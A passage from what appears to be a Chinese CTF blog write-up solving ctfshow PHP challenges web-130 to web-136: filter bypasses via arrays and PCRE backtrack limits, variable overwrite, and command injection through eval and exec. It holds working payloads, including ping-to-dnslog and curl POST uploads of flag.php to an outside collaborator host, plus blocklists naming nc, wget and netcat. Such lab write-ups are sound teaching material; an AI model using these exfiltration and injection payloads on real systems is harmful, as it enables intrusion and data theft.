<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode|ctfshow/</span>resource=flag.php<br>?f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/|ctfshow/</span>resource=flag.php<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/3756726.html">目录穿越详解</a></p>
<hr>
<h2 id="web-130（数组绕过preg-match-stripos、正则匹配）"><a href="#web-130（数组绕过preg-match-stripos、正则匹配）" class="headerlink" title="web-130（数组绕过preg_match&#x2F;stripos、正则匹配）"></a>web-130（数组绕过preg_match&#x2F;stripos、正则匹配）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>我们用post传入的f，我们要构造payload，让其能绕过preg_match正则匹配和stripos匹配。</p>
<p>payload：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">**+?表示 重复<span class="hljs-number">1</span>次或更多次，但尽可能少重复意思是ctfshow前面必须至少有一个字符，才会匹配到，并且下面的stripos函数要求必须匹配到ctfshow，所以直接传ctfshow即可**<br><br><span class="hljs-built_in">post</span>：f=ctfshow<br><br>也可以使用数组绕过preg_match和stripos<br>因为preg_match无法处理数组会直接返回<span class="hljs-literal">false</span>，并且stripos()是匹配子串，遇到数组，直接输出<span class="hljs-literal">null</span>。注意，两个等于（<span class="hljs-literal">null</span>==<span class="hljs-literal">false</span>）成立；三个等于（<span class="hljs-literal">null</span>===<span class="hljs-literal">false</span>）不成立。<br><br><span class="hljs-built_in">post</span>：f[]=<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-131（PCRE回溯次数绕过preg-match）"><a href="#web-131（PCRE回溯次数绕过preg-match）" class="headerlink" title="web-131（PCRE回溯次数绕过preg_match）"></a>web-131（PCRE回溯次数绕过preg_match）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;36Dctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>这里将我们传的f的值进行了强制类型转换，转成了字符串类型，导致无法绕过stripos，这里只能用PCRE回溯次数绕过。</strong></p>
<p>python脚本：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br><span class="hljs-attribute">url</span>=<span class="hljs-string">&#x27;http://ced5ea6a-1d3b-4f66-a3ff-61a42deeaec4.challenge.ctf.show:8080/&#x27;</span><br>data=&#123;<br>    <span class="hljs-string">&#x27;f&#x27;</span>:<span class="hljs-string">&#x27;show&#x27;</span><span class="hljs-number">*250002</span>+<span class="hljs-string">&#x27;36Dctfshow&#x27;</span><br>&#125;<br><span class="hljs-attribute">r</span>=requests.post(url=url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="PCRE回溯次数绕过"><a href="#PCRE回溯次数绕过" class="headerlink" title="PCRE回溯次数绕过"></a>PCRE回溯次数绕过</h3><p>1.正则最大回溯次数绕过<br> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br> 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。</p>
<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=&#123;<span class="hljs-string">&#x27;f&#x27;</span>:<span class="hljs-string">&#x27;very&#x27;</span>*<span class="hljs-number">250000</span>+<span class="hljs-string">&#x27;ctfshow&#x27;</span> &#125; r=requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-132（逻辑运算符优先级）"><a href="#web-132（逻辑运算符优先级）" class="headerlink" title="web-132（逻辑运算符优先级）"></a>web-132（逻辑运算符优先级）</h2><p>这题要先访问robots.txt，然后访问admin才能看到源码</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> === <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x36D</span>) &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-variable">$flag</span> || <span class="hljs-variable">$username</span> ===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> == <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：<br><code>if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</code></p>
<p><strong>当&amp;&amp;和||同时存在时，会从左往右进行运算，</strong></p>
<p><strong>x || y 或   如果 x 和 y 至少有一个为 true，则返回 true</strong> </p>
<p><strong>所以只要保证$username&#x3D;&#x3D;&#x3D;’admin’为true即可，</strong></p>
<p><strong>mt_rand — 生成更好的随机数</strong></p>
<p>payload：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=&amp;code=<span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-133（curl、无回显的shell-exec命令执行、DNSlog外带）"><a href="#web-133（curl、无回显的shell-exec命令执行、DNSlog外带）" class="headerlink" title="web-133（curl、无回显的shell_exec命令执行、DNSlog外带）"></a>web-133（curl、无回显的shell_exec<strong>命令执行</strong>、DNSlog外带）</h2><p>源码：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">highlight_file</span>(__FILE__);<br><span class="hljs-comment">//flag.php</span><br><span class="hljs-built_in">if</span>($F = @$_GET[&#x27;F&#x27;])&#123;<br>    <span class="hljs-built_in">if</span>(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;<br>        <span class="hljs-built_in">eval</span>(substr($F,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>));<br>    &#125;else&#123;<br>        <span class="hljs-built_in">die</span>(&quot;<span class="hljs-number">6</span>个字母都还不够呀?!&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：<br><strong>源码过滤了很多命令执行的函数，但是这里还可以使用 无回显的shell_exec命令执行</strong></p>
<p><strong>然后还使用了substr截取我们传入的命令索引值为0-5的字符</strong></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">get传参	F=<span class="hljs-string">`$F `</span>;<span class="hljs-keyword">sleep</span> <span class="hljs-number">3</span><br>经过<span class="hljs-keyword">substr</span>(<span class="hljs-variable">$F</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)截取后 得到 <span class="hljs-string">`F `</span>;<br>我们把原来的<span class="hljs-variable">$F</span>带进去<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;``<span class="hljs-variable">$F</span> `;sleep 3`&quot;</span>);<br>所以也就是说最终会执行<span class="hljs-string">`   `</span><span class="hljs-variable">$F</span> <span class="hljs-string">`;sleep 3  `</span> == shell_exec(<span class="hljs-string">&quot;`<span class="hljs-variable">$F</span> `;sleep 3&quot;</span>);<br>前面的命令不需要管，后面的命令就随我们自由控制了<br>所以服务器上就成功执行了<span class="hljs-keyword">sleep</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>

<p>payload：</p>
<p><strong><a href="ceye.io">dnslog外带平台</a></strong></p>
<p><strong>用dnslog获得子域</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">?F=`<span class="hljs-variable">$F</span> `;ping `<span class="hljs-built_in">cat</span> flag.php | grep ctfshow | <span class="hljs-built_in">tr</span> -<span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;[a-z]&quot;</span>/<span class="hljs-string">&quot;[0-9]&quot;</span>`.krmij5.dnslog.cn -c 1<br><br>	// -c: 设置完成要求回应的次数<br>	// grep ctfshow: 打印匹配ctfhsow的行<br>	// <span class="hljs-built_in">tr</span> -<span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;[a-z]&quot;</span>：只保留a-z<br></code></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span><br>&gt;&gt;<span class="hljs-operator">-F</span>参数用来向服务器上传二进制文件<br><br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&#x27;file=@photo.png&#x27;</span> https://google.com/profile<br><br>上面命令会给 HTTP 请求加上标头Content<span class="hljs-literal">-Type</span>: multipart/form<span class="hljs-literal">-data</span>，然后将文件photo.png作为file字段上传。<br><br>&gt;&gt;<span class="hljs-operator">-F</span>参数可以指定 MIME 类型。<br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&#x27;file=@photo.png;type=image/png&#x27;</span> https://google.com/profile<br><br>上面命令指定 MIME 类型为image/png，否则 <span class="hljs-built_in">curl</span> 会把 MIME 类型设为application/octet<span class="hljs-literal">-stream</span>。<br><br>&gt;&gt;<span class="hljs-operator">-F</span>参数也可以指定文件名。<br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&#x27;file=@photo.png;filename=me.png&#x27;</span> https://google.com/profile<br><br>上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。<br><br><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span><br><span class="hljs-literal">-X</span>参数指定 HTTP 请求的方法。<br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST https://www.example.com<br><br>上面命令对https://www.example.com发出 POST 请求。<br></code></pre></td></tr></table></figure>

<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">可以用curl -F 将flag文件上传到Burp的 Collaborator <span class="hljs-built_in">Client</span> （ Collaborator <span class="hljs-built_in">Client</span> 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）<br></code></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#其中-F 为带文件的形式发送post请求</span><br><span class="hljs-comment">#xx是上传文件的name值，flag.php就是上传的文件 </span><br><br>payload：<br><span class="hljs-string">?F</span>=<span class="hljs-string">`$F`</span>;+curl -X <span class="hljs-variable constant_">POST</span> -F xx=<span class="hljs-variable">@flag</span>.php <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/（域名地址）</span><br></code></pre></td></tr></table></figure>

<p><strong>使用bp工具中的collaborator：</strong></p>
<p><img src="/../image/ctfshow-php%E7%89%B9%E6%80%A7-1.png"></p>
<p>先复制一个域名地址，然后get传入payload，传入之后轮询即可</p>
<p>payload：</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">?F=<span class="hljs-string">`$F`</span>;+curl -X POST -F xx=<span class="hljs-keyword">@flag</span>.php http:<span class="hljs-comment">//go87ficuwhpxdp8tzmkz9dsovf16p8dx.oastify.com</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-134（-SERVER-‘QUERY-STRING’-、parse-str、extract）"><a href="#web-134（-SERVER-‘QUERY-STRING’-、parse-str、extract）" class="headerlink" title="web-134（$_SERVER[‘QUERY_STRING’]、parse_str、extract）"></a>web-134（$_SERVER[‘QUERY_STRING’]、parse_str、extract）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);		<span class="hljs-comment">//把get传入的变量解析成多个变量</span><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);							<span class="hljs-comment">//把$_POST数组导入到当前符号表</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> == <span class="hljs-string">&#x27;36d&#x27;</span> &amp;&amp; <span class="hljs-variable">$key2</span> == <span class="hljs-string">&#x27;36d&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>是获取get的参数以及值。</strong></p>
<p><strong><code>parse_str</code>：将字符串解析到变量中。</strong></p>
<p><strong><code>extract()</code>：从数组中将变量导入到当前的符号表(简单来说就是，将数组里的键给搞成变量，将数组的值给对应的键)。</strong></p>
<p>我们构造payload：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?_POST[key1]<span class="hljs-punctuation">=</span><span class="hljs-number">36</span>d<span class="hljs-meta">&amp;_POST[key2]=36d</span><br><span class="hljs-comment">//因为php文件不会直接显现出来，所以需要查看源代码</span><br></code></pre></td></tr></table></figure>

<p>首先<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取到get的参数和值，然后<code>parse_str</code>将<code>_POST[key1]=36d&amp;_POST[key2]=36d</code>转化为<code>$_POST</code>（数组），<code>extract</code>将<code>$_POST[key1]=36d、$_POST[key2]=36d</code>转化为<code>$key1=36d、$key2=36d</code></p>
<hr>
<h2 id="web-135（nl（linux））"><a href="#web-135（nl（linux））" class="headerlink" title="web-135（nl（linux））"></a>web-135（nl（linux））</h2><p>源码：</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coq">error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(__FILE__);<br>//flag.php<br><span class="hljs-keyword">if</span>($F = @$_GET[&#x27;F&#x27;])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(&#x27;/system|<span class="hljs-type">nc</span>|<span class="hljs-type">wget</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">passthru</span>|<span class="hljs-type">bash</span>|<span class="hljs-type">sh</span>|<span class="hljs-type">netcat</span>|<span class="hljs-type">curl</span>|<span class="hljs-type">cat</span>|<span class="hljs-type">grep</span>|<span class="hljs-type">tac</span>|<span class="hljs-type">more</span>|<span class="hljs-type">od</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">tail</span>|<span class="hljs-type">less</span>|<span class="hljs-type">base64</span>|<span class="hljs-type">rev</span>|<span class="hljs-type">cut</span>|<span class="hljs-type">od</span>|<span class="hljs-type">strings</span>|<span class="hljs-type">tailf</span>|<span class="hljs-type">head</span>/i&#x27;, $F))&#123;<br>        eval(substr($F,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        die(<span class="hljs-string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>这题和133很像，但是把curl和很多命令都过滤掉了，但是还有一个nl可以用，绕过方法还是133题的方法。</strong></p>
<p><strong>ping没被过滤，dnslog外带应该也可以，但是我这里失败了</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ;">?F=`$F`+;nl flag.php &gt; a	//查看flag.php文件，再重定向到a文件中，访问url/a即可下载文件后查看<br>加文件后缀也可以<br>?F=`$F`+;nl flag.php &gt; a.txt	//然后访问url/a.txt即可<br><br>cp好像也可以<br>F=`$F `;cp flag.php 1.txt	//然后访问url/1.txt即可<br><br>另一种绕过payload<br>?F=`$F `;nl flag.php &gt; a<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-136（tee、nl、exec-）"><a href="#web-136（tee、nl、exec-）" class="headerlink" title="web-136（tee、nl、exec()）"></a>web-136（tee、nl、exec()）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>题目过滤了很多命令，很明显，需要我们get传c的值，然后使用exec函数去命令执行，可以使用tee和nl来获取flag</strong></p>
<p><strong>tee可以用来实现将标准输入写入文件的功能，因为这里重定向符被过滤了所以只能用tee了</strong></p>
<p>payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">首先使用<span class="hljs-built_in">ls</span>、管道输出符加<span class="hljs-built_in">tee</span>实现扫描当前目录并写入到文件1中的目的，注意不能用文件后缀，因为点被过滤了<br>?c=<span class="hljs-built_in">ls</span> / | <span class="hljs-built_in">tee</span> 1<br><br>然后url/1即可下载文件，然后打开发现一个f149_15_h3r3文件，猜测是flag，然后使用<span class="hljs-built_in">nl</span>或者<span class="hljs-built_in">cat</span>来读取flag并写入到文件2中<br>?c=<span class="hljs-built_in">nl</span> /f149_15_h3r3 | <span class="hljs-built_in">tee</span> 2<br>?c=<span class="hljs-built_in">cat</span> /f149_15_h3r3 | <span class="hljs-built_in">tee</span> 2<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong><code>exec(string $command, array &amp;$output = ?, int &amp;$return_var = ?): string</code></strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>() 执行 command 参数所指定的命令。<br>例：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出运行中的 php/httpd 进程的创建者用户名</span><br><span class="hljs-comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="tee（linux）"><a href="#tee（linux）" class="headerlink" title="tee（linux）"></a>tee（linux）</h3><p>tee命令是Linux中常用的命令。这是一个简单但功能强大的命令，用于读取标准输入，然后将其写入文件以及标准输出。</p>
<p>下是 tee 命令的一些最常用选项 -</p>
